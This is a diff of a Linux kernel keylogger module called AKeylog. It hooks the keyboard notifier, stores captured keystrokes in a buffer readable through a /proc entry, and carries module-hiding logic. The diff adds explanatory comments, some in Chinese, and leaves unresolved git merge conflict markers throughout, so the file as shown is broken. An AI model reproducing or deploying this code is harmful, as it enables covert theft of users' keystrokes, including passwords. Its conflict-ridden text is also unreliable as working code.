@@ -61,6 +61,10 @@ static void show_module(void){
 	module_hidden=0;
 }
 
+<<<<<<< HEAD
+=======
+// define callback function
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
 int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){
     struct keyboard_notifier_param *param = _param;
     char buf[128];
@@ -94,17 +98,28 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
 			strcat(keylogger_log, buf);
 			keylogger_log_len+=len; 
             up(&Mysemaphore);
+<<<<<<< HEAD
         
+=======
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
         }
     }
     return NOTIFY_OK;
 }
 
+<<<<<<< HEAD
+=======
+// define notifier block
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
 static struct notifier_block keylogger_nb ={
     .notifier_call = keylogger_notify
 };
 
 int procfs_open(struct inode *inode, struct file *file){
+<<<<<<< HEAD
+=======
+	// judge the state of module, increase the reference count
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
 	try_module_get(THIS_MODULE);
 	return 0;
 }
@@ -143,10 +158,18 @@ static ssize_t procfs_write(struct file *file, const char *buffer, size_t length
 }
 
 int procfs_close(struct inode *inode, struct file *file){
+<<<<<<< HEAD
+=======
+	// decrease the reference number of module
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
 	module_put(THIS_MODULE);
 	return 0;
 }
 
+<<<<<<< HEAD
+=======
+// set the callback operation of the proc
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
 static const struct file_operations fops = {
 	.owner = THIS_MODULE,
 	.read = procfs_read,
@@ -155,6 +178,7 @@ static const struct file_operations fops = {
 	.release = procfs_close,
 };
 
+<<<<<<< HEAD
 static int __init AKeylog_init(void){
 	
 	our_proc_file = proc_create(DeviceName, 0644 , NULL, &fops);
@@ -166,12 +190,36 @@ static int __init AKeylog_init(void){
     printk(KERN_ALERT "AKeylog: Kernel-Based Keylogger is Registered, have fun\n");
     memset(keylogger_log,0,KEYLOGGER_LOG_SIZE);
 	keylogger_log_len=0;
+=======
+// Keylogger start here
+static int __init AKeylog_init(void){
+	
+	// create proc
+	our_proc_file = proc_create(DeviceName, 0644 , NULL, &fops);
+	// filename = DeviceName(AKeylog); authority = 0644; parent = NULL
+
+	if(!our_proc_file){
+		printk(KERN_ALERT "AKeylog: Registration Failure.\n");
+		return -ENOMEM;
+	}
+
+	// register a new notifier block
+    register_keyboard_notifier(&keylogger_nb);
+    printk(KERN_ALERT "AKeylog: Kernel-Based Keylogger is Registered, have fun\n");
+
+	// set the first 2018 bytes as 0
+    memset(keylogger_log,0,KEYLOGGER_LOG_SIZE);
+	keylogger_log_len=0;
+
+	// initialize sema
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
     sema_init(&Mysemaphore, 1);
     return 0;
 }
 
 static void __exit AKeylog_exit(void){
     unregister_keyboard_notifier(&keylogger_nb);
+<<<<<<< HEAD
     remove_proc_entry(DeviceName, NULL);//要从 /proc 中删除一个文件，可以使用 remove_proc_entry 函数。
 	//要使用这个函数，我们需要提供文件名字符串，以及这个文件在 /proc 文件系统中的位置（parent）。
     printk(KERN_ALERT "AKeylog: Kernel-Based Keylogger is UnRegistered, GoodBye\n");
@@ -183,3 +231,13 @@ static void __exit AKeylog_exit(void){
 
 module_init(AKeylog_init);
 module_exit(AKeylog_exit);
+=======
+    remove_proc_entry(DeviceName, NULL);
+    printk(KERN_ALERT "AKeylog: Kernel-Based Keylogger is UnRegistered, GoodBye\n");
+}
+
+// load module
+module_init(AKeylog_init);
+// remove module
+module_exit(AKeylog_exit);
+>>>>>>> 1b16ac19fd69b6d61096c27e06fbe408b51f3aec
